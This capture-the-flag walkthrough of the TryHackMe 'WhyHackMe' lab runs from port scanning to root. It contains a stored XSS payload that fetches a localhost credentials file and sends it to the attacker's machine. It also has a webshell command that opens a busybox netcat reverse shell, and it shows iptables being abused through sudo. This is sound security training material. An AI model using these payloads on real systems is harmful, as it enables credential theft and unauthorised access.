# TryHackMe: WhyHackMe — Full Walkthrough

A detailed walkthrough of the "WhyHackMe" room on TryHackMe. This room covers web application vulnerabilities, including Stored XSS, and privilege escalation techniques on a Linux system.

---

## 🔍 Phase 1: Reconnaissance

The first step is to identify open ports and services running on the target machine.

### Nmap Scan

An `nmap` scan reveals three open ports:
- **21 (FTP)**: vsftpd 3.0.3
- **22 (SSH)**: OpenSSH 8.2p1
- **80 (HTTP)**: Apache httpd 2.4.41

```bash
nmap -T4 -n -sC -sV -Pn -p- 10.10.53.1
```
<details>
<summary>Click to expand Nmap Scan Results</summary>

```
Nmap scan report for 10.10.53.1
Host is up (0.089s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.53.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
|_  256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!!
|_http-server-header: Apache/2.4.41 (Ubuntu)
41312/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
</details>

### FTP Enumeration

Anonymous login is enabled on the FTP server. Logging in reveals a file named `update.txt`.

```
Hey I just removed the old user mike because that account was compromised and for any
of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry
this file is only accessible by localhost(127.0.0.1), so nobody else can view it except
me or people with access to the common account. 
- admin
```
The note mentions that credentials for a new account are located at `127.0.0.1/dir/pass.txt` and are only accessible from localhost.

### Web Enumeration

Running `gobuster` to find directories and files on the web server.

```bash
gobuster dir -u 'http://10.10.53.1/' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php
```

**Key Findings:**
- `/index.php`
- `/blog.php`
- `/login.php`
- `/register.php`
- `/dir` (Status: 403 Forbidden)

Navigating to `/dir/pass.txt` results in a `403 Forbidden` error, as expected. The `/blog.php` page has a comment from the admin, indicating they monitor comments. This suggests a potential for a **Stored Cross-Site Scripting (XSS)** vulnerability.

---

## 🧪 Phase 2: Gaining a Foothold via Stored XSS

Since the admin monitors the comments on `/blog.php`, we can attempt to steal the credentials from `127.0.0.1/dir/pass.txt` by injecting a malicious script.

### Crafting the XSS Payload

1.  **Register a new user:** The username will be our XSS payload.
2.  **The Payload:** This script will fetch the content of `pass.txt` from localhost and send it to our attacker machine.

    ```html
    <script>fetch("http://127.0.0.1/dir/pass.txt").then(r => r.text()).then(t => fetch("http://<YOUR-IP>:1234?q="+t,{mode:"no-cors"}))</script>
    ```

### Executing the Attack

1.  Create a user with the payload as the username.
2.  Log in as the new user.
3.  Post a comment on `/blog.php`. This will store the XSS payload.
4.  Start a listener on your machine to receive the credentials. A simple Python web server will work.

    ```bash
    python3 -m http.server 1234
    ```

When the admin views the comment, the script will execute, and you will receive a GET request with the credentials.

```
10.10.53.1 - - [09/Nov/2025 19:22:02] "GET /?q=jack:[REDACTED] HTTP/1.1" 200 -
```

With the credentials for the user `jack`, we can now SSH into the machine and retrieve the user flag from `/home/jack/user.txt`.

---

## 🔼 Phase 3: Privilege Escalation

Now that we have user access, the next step is to escalate our privileges to root.

### Sudo Enumeration

Checking `sudo -l` reveals that the user `jack` can run `/usr/sbin/iptables` as any user.

```bash
sudo -l
```
```
User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```

### Investigating Local Files

In the `/opt` directory, there are two interesting files: `urgent.txt` and `capture.pcap`.

`urgent.txt` contains:
```
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when
I try to remove them, they wont, even though I am root. Please go through the pcap 
file in /opt and help me fix the server. And I temporarily blocked the attackers
access to the backdoor by using iptables rules. The cleanup of the server is still
incomplete I need to start by deleting these files first.
```

This note tells us:
- There's a backdoor in `/usr/lib/cgi-bin/`.
- The attacker's access is blocked by an `iptables` rule.
- A `capture.pcap` file is available for analysis.

### Analyzing the PCAP File

Transfer `capture.pcap` to your local machine for analysis with Wireshark. The traffic is TLS encrypted, but we can see a hostname: `boring.box`.

### Unblocking the Backdoor

Since we can run `iptables` with `sudo`, we can remove the rule blocking access to the backdoor. The Nmap scan showed a filtered port `41312`.

```bash
sudo iptables -D INPUT 1
sudo iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
```

### Decrypting TLS Traffic

To decrypt the TLS traffic in the `pcap` file, we need the private key. The Apache configuration files are a good place to look. The private key is found at `/etc/apache2/certs/apache.key`.

1.  Copy the key to your local machine.
2.  In Wireshark, go to `Edit -> Preferences -> Protocols -> TLS`.

After importing the key, the traffic is decrypted, revealing a webshell:
`https://10.10.53.1:41312/cgi-bin/5UP3r53Cr37.py`

### Gaining a Reverse Shell

We can use the webshell to get a reverse shell.

```bash
https://10.10.53.1:41312/cgi-bin/5UP3r53Cr37.py?cmd=busybox nc <YOUR-IP> 4444 -e bash
```

Start a listener on your machine (`nc -lvnp 4444`) to catch the shell. You will get a shell as the `www-data` user.

### Root Access

Check `sudo -l` for the `www-data` user.

```
User www-data may run the following commands on this host:
    (ALL) NOPASSWD: ALL
```

The `www-data` user has full sudo access. Switch to root using `sudo su` and retrieve the final flag from `/root/root.txt`.

---

## 🏁 Conclusion

This room was a great exercise in web application testing and privilege escalation. The key takeaways are:
- Always check for low-hanging fruit like anonymous FTP access.
- Stored XSS can be a powerful vector for exfiltrating information.
- Misconfigured `sudo` permissions are a common path to privilege escalation.
- Analyzing network traffic can reveal hidden backdoors and vulnerabilities.
